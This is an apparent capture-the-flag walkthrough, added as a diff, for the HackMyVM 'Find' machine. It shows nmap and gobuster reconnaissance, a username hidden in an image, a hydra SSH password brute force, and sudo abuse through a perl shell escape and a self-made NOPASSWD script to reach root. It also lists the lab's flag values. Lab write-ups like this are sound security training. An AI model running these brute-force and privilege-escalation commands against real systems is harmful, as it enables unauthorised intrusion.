@@ -1,0 +1,130 @@
+🟢 Executive Summary
+Severity: High
+Description:
+Initial access was gained by downloading a .jpg file from the web server, which contained hidden, encoded information in the Malbolge esoteric language. After decoding, the username missyred was discovered. SSH access was obtained by brute-forcing the password using hydra and the rockyou.txt wordlist. Privilege escalation was achieved first by abusing sudo permissions to escalate from missyred to kings using perl, and finally to root by exploiting a misconfigured script (/opt/boom/boom.sh) that could be executed as root without a password.
+
+🖥️ Scope and Environment
+
+Platform: HackMyVM
+
+Machine: Find
+
+Assigned IP: 192.168.1.135
+
+Date of Analysis: 27/07/2025
+
+🛠 Tools Used
+
+nmap
+
+gobuster
+
+curl
+
+xxd
+
+hydra
+
+ssh
+
+perl
+
+nano
+
+🔍 Finding Description
+
+4.1 Port Scanning
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.135
+nmap -sCV -p22,80 192.168.1.135
+Identified Ports:
+
+22/tcp – OpenSSH 7.9p1
+
+80/tcp – Apache httpd 2.4.38
+
+4.2 Web Resource Discovery
+
+gobuster dir -u http://192.168.1.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,jpg,png -t 50 -k -r
+Discovered paths:
+
+/index.html
+
+/manual
+
+/robots.txt
+
+/cat.jpg ← 🔍 Interesting
+
+4.3 Hidden Information in Image
+
+curl -O http://192.168.1.135/cat.jpg
+xxd -b cat.jpg | tail
+Hidden string at the end (appears encoded):
+
+>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba...
+
+Decoded using a Malbolge interpreter online:
+
+missyred
+4.4 SSH Brute Force
+
+hydra -l missyred -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.135 -t 64 -I
+Result:
+
+Username: missyred
+
+Password: iloveyou
+
+SSH access:
+
+ssh missyred@192.168.1.135
+4.5 Privilege Escalation – User missyred → kings
+
+sudo -l
+Output:
+
+User missyred may run the following command as kings:
+    (kings) /usr/bin/perl
+Exploit:
+
+sudo -u kings perl -e 'exec "/bin/bash";'
+Confirmed:
+
+whoami
+# kings
+📝 Flag obtained:
+user.txt → f4e690f638c01bd8a19fb1349d40519c
+
+4.6 Privilege Escalation – User kings → root
+sudo -l
+Output:
+
+User kings may run the following command as root:
+    (ALL) NOPASSWD: /opt/boom/boom.sh
+Directory didn’t exist, so it was manually created:
+
+mkdir /opt/boom
+nano /opt/boom/boom.sh
+boom.sh contents:
+
+#!/bin/bash
+/bin/bash
+Make it executable:
+
+chmod +x /opt/boom/boom.sh
+Run it as root:
+
+sudo /opt/boom/boom.sh
+Confirmed:
+
+whoami
+# root
+📝 Flag obtained:
+root.txt → c8aaf0f3189e000006c305bbfcbeb790
+
+🏁 Flags Obtained
+
+user.txt – f4e690f638c01bd8a19fb1349d40519c
+
+root.txt – c8aaf0f3189e000006c305bbfcbeb790
